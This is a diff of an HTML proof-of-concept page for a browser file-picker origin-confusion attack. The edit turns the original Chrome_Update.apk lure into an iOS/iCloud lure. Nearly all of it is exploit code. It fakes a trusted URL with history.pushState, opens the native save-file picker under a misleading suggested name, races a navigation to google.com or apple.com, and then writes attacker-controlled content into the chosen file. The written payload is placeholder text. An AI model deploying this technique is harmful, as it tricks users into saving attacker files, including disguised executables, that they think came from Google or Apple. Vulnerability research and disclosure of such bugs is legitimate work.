@@ -1,37 +1,51 @@
 <!doctype html>
-<title>File Picker Origin Confusion PoC</title>
+<html>
+<head>
+<meta charset="utf-8">
+<title>iOS File Picker UI Confusion PoC</title>
+</head>
+<body>
 
-<h1 id="trigger">Click to continue</h1>
+<h1 id="trigger">Tap to continue</h1>
 
 <script>
-let fileHandle;
+const trigger = document.getElementById('trigger');
 
-document.getElementById('trigger').onclick = async () => {
-  // Step 1: Fake trusted URL
-  history.pushState({}, '', '/trusted/update');
+trigger.addEventListener('click', async () => {
+  if (!window.showSaveFilePicker) return;
 
-  // Step 2: Open privileged picker
-  fileHandle = await showSaveFilePicker({
-    suggestedName: 'Chrome_Update.apk',
-    types: [{
-      description: 'Executable',
-      accept: { 'application/octet-stream': ['.apk'] }
-    }]
-  });
+  // Step 1: Make URL look trusted
+  history.pushState({}, '', '/icloud/storage');
 
-  // Step 3: Navigation race
-  setTimeout(() => {
-    location.href = 'https://www.google.com';
-  }, 50);
+  try {
+    // Step 2: Native file picker (trusted UI)
+    const handle = await showSaveFilePicker({
+      suggestedName: 'iCloud_Storage_Report.zip',
+      types: [{
+        description: 'ZIP Archive',
+        accept: { 'application/zip': ['.zip'] }
+      }]
+    });
 
-  // Step 4: Attacker STILL writes file
-  setTimeout(async () => {
-    const writable = await fileHandle.createWritable();
+    // Step 3: Navigation race (origin confusion)
+    setTimeout(() => {
+      location.href = 'https://www.apple.com';
+    }, 60);
+
+    // Step 4: Attacker-controlled content
+    const writable = await handle.createWritable();
     await writable.write(
-      'ATTACKER-CONTROLLED CONTENT\n' +
-      'User believed Google requested this file'
+      'PoC ONLY\n' +
+      'This ZIP was created by an attacker-controlled origin\n' +
+      'User believed it came from iCloud / Apple'
     );
     await writable.close();
-  }, 200);
-};
+
+  } catch (e) {
+    // user cancel expected
+  }
+}, { once: true });
 </script>
+
+</body>
+</html>
